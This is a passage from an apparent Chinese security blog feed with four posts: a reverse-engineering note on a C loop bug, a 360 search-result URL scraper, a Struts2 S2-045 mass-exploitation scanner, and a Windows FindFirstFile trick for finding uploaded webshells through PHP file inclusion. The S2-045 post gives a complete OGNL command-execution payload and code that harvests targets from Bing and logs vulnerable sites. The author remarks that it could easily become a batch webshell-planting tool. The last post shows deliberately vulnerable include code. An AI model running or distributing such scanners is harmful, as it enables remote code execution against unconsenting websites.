<p><img src="https://ooo.0o0.ooo/2017/03/09/58c120f1a650e.png" alt="snipaste_20170309_173122.png"></p>
<p>此时再次跳转到<code>0040108e</code>，然后<code>EBP-4</code>中的值再次增加了1，现在也就是<code>EBP-4</code>中的值变为了0A，cmp比较之后<code>EBP-4</code>中的值依旧不比0A大，接着执行<code>mov ecx,dword ptr [ebp-4]</code>，此时ECX的值变成了0A，接着执行<code>mov dword ptr [ebp+ecx*4-2Ch],0</code>也就是<code>mov dword ptr [ebp-4],0</code></p>
<p>然后呢，你发现了什么？？？就是他喵的<code>EBP-4</code>中的值变成了0</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c12263d566e.png" alt="snipaste_20170309_173729.png"></p>
<p>变成0代表着什么？？？<code>EBP-4</code>中的值是我们拿来干嘛的？是用来和0A进行cmp然后决定是否结束函数的，可是我们辛辛苦苦循环了10次，第11次全泡汤了，唯一的变化就是数组都成了0，栈顶的值变化了不少，然后再次cmp的时候，0和0A比，决定了你还是要循环，不管多少次，最后都会把你用来计数的地址<code>EBP-4</code>中的值清零</p>
<p>这也就是为什么上面这段c语言代码会一直不停地循环的原因</p>
<p><strong>转载请注明出处</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于下面这段c语言代码会一直不停地循环，为什么呢？&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;HelloWorld&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a[] = &amp;#123;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;&amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i&amp;lt;=&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;; i++)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		a[i] = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Hello World!\n&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	HelloWorld();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	getchar();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://akkuman.coding.me/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://akkuman.coding.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>360搜索引擎取真实地址-python代码</title>
    <link href="http://akkuman.coding.me/2017/03/08/360-Search-Engine-get-realURL-with-python.html"/>
    <id>http://akkuman.coding.me/2017/03/08/360-Search-Engine-get-realURL-with-python.html</id>
    <published>2017-03-08T13:12:59.000Z</published>
    <updated>2017-03-08T13:46:42.978Z</updated>
    
    <content type="html"><![CDATA[<p>还是个比较简单的，不像百度有加密算法</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452&amp;q=inurl%3Anews.do&amp;ts=1488978912&amp;t=89c5361a44fe3f52931d25c6de262bb&amp;src=haosou</div></pre></td></tr></table></figure>
<p>网址是上面这个样子，没加密直接取就好了，去掉头<code>http://www.so.com/link?url=</code>和尾<code>&amp;q=</code>一直到末尾的部分，剩下的就可以吃了<br><a id="more"></a><br>那么规则我们就可以写出来了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a[<span class="string">'href'</span>][a[<span class="string">'href'</span>].index(<span class="string">'?url='</span>):a[<span class="string">'href'</span>].index(<span class="string">'&amp;q='</span>)][<span class="number">5</span>:]</div></pre></td></tr></table></figure></p>
<p><code>a[&#39;href&#39;]</code>是待处理网址,<code>a[&#39;href&#39;].index(&#39;?url=&#39;):a[&#39;href&#39;].index(&#39;&amp;q=&#39;)</code>的部分为<code>?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452</code></p>
<p>最后还需要用unquote解码</p>
<ul>
<li>在python3中是<code>urllib.parse.unquote</code></li>
<li>在python2中是<code>urllib.unquote</code></li>
</ul>
<h1 id="code"><a href="#code" class="headerlink" title="code"></a>code</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">"User-Agent"</span> : <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">#爬取360搜索引擎真实链接，第一个参数关键词str，第二个参数爬取页数int</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse360</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.so.com/s?q='</span> + str(keyword) + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            urls = [unquote(a[<span class="string">'href'</span>][a[<span class="string">'href'</span>].index(<span class="string">'?url='</span>):a[<span class="string">'href'</span>].index(<span class="string">'&amp;q='</span>)][<span class="number">5</span>:]) <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'li.res-list &gt; h3 &gt; a'</span>)]</div><div class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> urls:</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div></pre></td></tr></table></figure>
<p>用法示例:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> parse360(<span class="string">"keyword"</span>,<span class="number">10</span>):</div><div class="line">        <span class="keyword">if</span> url:</div><div class="line">            <span class="keyword">print</span> url</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<h1 id="最后上一张测试图"><a href="#最后上一张测试图" class="headerlink" title="最后上一张测试图"></a>最后上一张测试图</h1><p><img src="https://ooo.0o0.ooo/2017/03/08/58c009f5b3c1d.png" alt="snipaste_20170308_214047.png"></p>
<p><strong>转载请注明出处</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;还是个比较简单的，不像百度有加密算法&lt;/p&gt;
&lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;http://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452&amp;amp;q=inurl%3Anews.do&amp;amp;ts=1488978912&amp;amp;t=89c5361a44fe3f52931d25c6de262bb&amp;amp;src=haosou&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;网址是上面这个样子，没加密直接取就好了，去掉头&lt;code&gt;http://www.so.com/link?url=&lt;/code&gt;和尾&lt;code&gt;&amp;amp;q=&lt;/code&gt;一直到末尾的部分，剩下的就可以吃了&lt;br&gt;
    
    </summary>
    
      <category term="Python" scheme="http://akkuman.coding.me/categories/Python/"/>
    
    
      <category term="Python" scheme="http://akkuman.coding.me/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>s2-045漏洞批量检测工具</title>
    <link href="http://akkuman.coding.me/2017/03/07/st2-045-batch-Test-Tool.html"/>
    <id>http://akkuman.coding.me/2017/03/07/st2-045-batch-Test-Tool.html</id>
    <published>2017-03-07T13:28:53.000Z</published>
    <updated>2017-03-08T12:55:31.778Z</updated>
    
    <content type="html"><![CDATA[<p>今天晚上看老铁们在群里就这个st2-045漏洞讨论得火热，个人不太喜欢日站，本来想直接写个批量挂马的东西，但是想想还是算了，如果你有兴趣，改改也很容易，反正不关我的事</p>
<p>测试图<br><img src="https://ooo.0o0.ooo/2017/03/07/58beb8f48f7df.png" alt="TIM图片20170307212124.png"><br><a id="more"></a></p>
<p><strong>2017-3-8更新</strong></p>
<ul>
<li>增加了对.do关键词的支持，并且支持任何关键词了，之前我只考虑到了.action关键词并且写死了规则，py版本已经更新，<del>win版的exe未更新，需要的自行用pyinstaller打包为exe</del></li>
<li>之前采用whoami如果返回200状态码就判断存在漏洞，但是现在很多已经修复了，导致访问之后依旧会跳到正常页面返回200状态码，于是我改了一下判断，执行命令echo xxxx，如果返回结果中含有xxxx就证明漏洞存在</li>
<li>win版exe已经打包</li>
<li><strong>重要：建议大家都使用py版本，经过群友测试，exe版本对中文关键词的支持不太好，会出现错误，如果使用上有问题可评论</strong></li>
<li><strong>exe版本会出现扫描过慢的情况，强烈建议py版本，鉴于有些朋友说不会配置python环境，我在下面给出了例子</strong></li>
<li><strong>有些朋友说自定义关键字字典出错，这里要提一句，你的字典txt的编码需要是utf-8，有些东西因为写的比较快没考虑太全，见谅</strong><br><img src="https://ooo.0o0.ooo/2017/03/08/58bf96eadc438.png" alt="TIM图片20170308132948.png"></li>
</ul>
<p><strong>依赖包的安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//首先你需要安装一个python，在安装图中记得把有pip的选项和add python to path类似的选项勾选上，然后安装完成后执行python -version和pip</div><div class="line">//如果执行python -version提醒你有问题，试着重启一下cmd或者电脑，或者检查你的path环境变量下有没有python的安装的路径，没有的话就加上</div><div class="line">//如果正常证明环境安装成功，如果执行pip提醒你没有pip，就把你python安装路径下的Scripts目录加到path环境变量，然后在命令行在执行以下代码</div><div class="line">pip install requests</div><div class="line">pip install beautifulsoup4</div></pre></td></tr></table></figure></p>
<p>对于此脚本所放置文件夹下必须有keyword.txt用来存放一行行的关键词<br>最开始是打算直接全部读取然后一个一个跑，不过感觉时间太漫长，测试时间太久<br>后来改成关键词就是自己输入，但是又感觉太麻烦<br>然后就变成了现在的读取关键词然后标号直接输入序号就可以<br>途中遇到了有的网址直接拒绝访问导致报错，还有的超时一直不返回报文，这些都解决了，个人测试的结果还可以，结果保存在一个txt下，至于你想再干些什么，不关我的事情了</p>
<p><strong>说明</strong><br>例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python s2-045.py 9 10</div></pre></td></tr></table></figure></p>
<p>第一个参数是你的文件名，第二个是关键词所对应的序号，第三个是你需要爬行的页数<br>序号与关键词的对应，可以直接运行<code>python s2-045.py</code>就可以产看帮助<br>脚本采用的bing搜索引擎，<strong>文件我会打包在下面</strong></p>
<p>上代码,<strong>python2和3通用</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding:utf-8</span></div><div class="line"><span class="keyword">import</span> sys,requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line">keyword = &#123;&#125;</div><div class="line"><span class="keyword">with</span> open(<span class="string">"keyword.txt"</span>) <span class="keyword">as</span> f:</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> keywordLine <span class="keyword">in</span> f:</div><div class="line">        keyword[str(i)] = keywordLine.strip()</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line">usage = <span class="string">'''</span></div><div class="line">usage : python s2-045.py 0 10</div><div class="line"></div><div class="line">first parameter is your filename</div><div class="line">second parameter is your keyword's number which will be used by Bing</div><div class="line">Third parameter is the page number you want to crawl\n'''</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(actionURL)</span>:</span></div><div class="line">    data = <span class="string">'--447635f88b584ab6b8d9c17d04d79918\</span></div><div class="line">    Content-Disposition: form-data; name="image1"\</div><div class="line">    Content-Type: text/plain; charset=utf-8\</div><div class="line">    \</div><div class="line">    x\</div><div class="line">    --447635f88b584ab6b8d9c17d04d79918--'</div><div class="line">	</div><div class="line">    header = &#123;</div><div class="line">        <span class="string">"Content-Length"</span> : <span class="string">"155"</span>, </div><div class="line">        <span class="string">"User-Agent"</span> : <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>, </div><div class="line">        <span class="string">"Content-Type"</span> : <span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo hereisaexp').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>, </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        request = requests.post(actionURL, data=data, headers=header, timeout = <span class="number">10</span>)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">"None"</span>, <span class="string">"Refused"</span></div><div class="line">    <span class="keyword">return</span> request.text, request.status_code</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">returnURLList</span><span class="params">()</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'http://cn.bing.com/search?q='</span> +keyword[sys.argv[<span class="number">1</span>]]+ <span class="string">'&amp;first='</span></div><div class="line">    n =<span class="number">0</span></div><div class="line">    i = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> n &lt; int(sys.argv[<span class="number">2</span>]):</div><div class="line">        baseURL = keywordsBaseURL + str(i)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            req = requests.get(baseURL)</div><div class="line">            soup = BeautifulSoup(req.text, <span class="string">"html.parser"</span>)</div><div class="line">            text = soup.select(<span class="string">'li.b_algo &gt; h2 &gt; a'</span>)</div><div class="line">            <span class="keyword">if</span> <span class="string">'.action'</span> <span class="keyword">in</span> keyword[sys.argv[<span class="number">1</span>]]:</div><div class="line">                standardURL = [url[<span class="string">'href'</span>][:url[<span class="string">'href'</span>].index(<span class="string">'.action'</span>)]+<span class="string">'.action'</span> <span class="keyword">for</span> url <span class="keyword">in</span> text <span class="keyword">if</span> <span class="string">'.action'</span> <span class="keyword">in</span> url[<span class="string">'href'</span>]]</div><div class="line">            <span class="keyword">elif</span> <span class="string">'.do'</span> <span class="keyword">in</span> keyword[sys.argv[<span class="number">1</span>]]:</div><div class="line">                standardURL = [url[<span class="string">'href'</span>][:url[<span class="string">'href'</span>].index(<span class="string">'.do'</span>)]+<span class="string">'.do'</span> <span class="keyword">for</span> url <span class="keyword">in</span> text <span class="keyword">if</span> <span class="string">'.do'</span> <span class="keyword">in</span> url[<span class="string">'href'</span>]]</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                standardURL = [url[<span class="string">'href'</span>] <span class="keyword">for</span> url <span class="keyword">in</span> text]</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            print(<span class="string">"HTTPERROR"</span>)</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        i += <span class="number">10</span></div><div class="line">        n += <span class="number">1</span></div><div class="line">        <span class="keyword">yield</span> standardURL</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</div><div class="line">        print(usage)</div><div class="line">        <span class="keyword">for</span> k,v <span class="keyword">in</span> keyword.items():</div><div class="line">            print(<span class="string">"%s is %s"</span>%(k, v))</div><div class="line">        sys.exit()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> urlList <span class="keyword">in</span> returnURLList():</div><div class="line">        <span class="keyword">for</span> actionURL <span class="keyword">in</span> urlList:</div><div class="line">            text, code = poc(actionURL)</div><div class="line">            <span class="keyword">if</span> <span class="string">'hereisaexp'</span> <span class="keyword">in</span> text:</div><div class="line">                print(str(code) + <span class="string">"----Successful----"</span> + actionURL + <span class="string">'\n'</span>)</div><div class="line">                <span class="keyword">with</span> open(<span class="string">"AvailableURL.txt"</span>,<span class="string">"a"</span>) <span class="keyword">as</span> f:</div><div class="line">                    f.write(actionURL+<span class="string">'\n'</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                print(str(code)+<span class="string">'----'</span>+actionURL+<span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p><strong><a href="http://file.codecat.one" target="_blank" rel="external">下载地址</a></strong></p>
<p><strong>打包了win版，大家可以直接使用，例如在该exe目录下执行<del>（更新的并未打包出exe，如有需要可以自行用pyinstaller打包）</del></strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s2-045.exe 9 10</div></pre></td></tr></table></figure></p>
<p><strong>其他用法参照上面</strong><br><strong>转载请注明出处</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天晚上看老铁们在群里就这个st2-045漏洞讨论得火热，个人不太喜欢日站，本来想直接写个批量挂马的东西，但是想想还是算了，如果你有兴趣，改改也很容易，反正不关我的事&lt;/p&gt;
&lt;p&gt;测试图&lt;br&gt;&lt;img src=&quot;https://ooo.0o0.ooo/2017/03/07/58beb8f48f7df.png&quot; alt=&quot;TIM图片20170307212124.png&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://akkuman.coding.me/categories/Tools/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Windows FindFirstFile利用</title>
    <link href="http://akkuman.coding.me/2017/03/04/Windows-FindFirst-Exploit.html"/>
    <id>http://akkuman.coding.me/2017/03/04/Windows-FindFirst-Exploit.html</id>
    <published>2017-03-04T07:16:27.000Z</published>
    <updated>2017-03-04T07:59:41.623Z</updated>
    
    <content type="html"><![CDATA[<p>目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。</p>
<p>利用方法很简单，我们只要将文件名不可知部分之后的字符用”&lt;”或者”&gt;”代替即可，不过要注意一点是，只使用一个”&lt;”或者”&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求”1&lt;”或者”1&gt;”都是访问不到文件的，需要”1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。<br><a id="more"></a><br>我们来做个简单的测试，测试代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//1.php</span></div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p> 再在同目录下新建一个文件名为”123456.txt”的文件，内容为<code>phpinfo()</code>函数，请求<code>/1.php?file=1&lt;&lt;</code>即可包含。<br> <img src="https://ooo.0o0.ooo/2017/03/04/58ba6a75887a8.png" alt="d8336189e9e8ab752ec855e7ed94a9b7.jpg.png"></p>
<h1 id="常用的漏洞代码"><a href="#常用的漏洞代码" class="headerlink" title="常用的漏洞代码"></a>常用的漏洞代码</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2> <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</div><div class="line">		<span class="keyword">include</span>($_GET[page]);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">include</span> <span class="string">'show.php'</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</div><div class="line">		<span class="keyword">include</span>(<span class="string">'./action/'</span> . $_GET[page]);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">include</span> <span class="string">'./action/show.php'</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
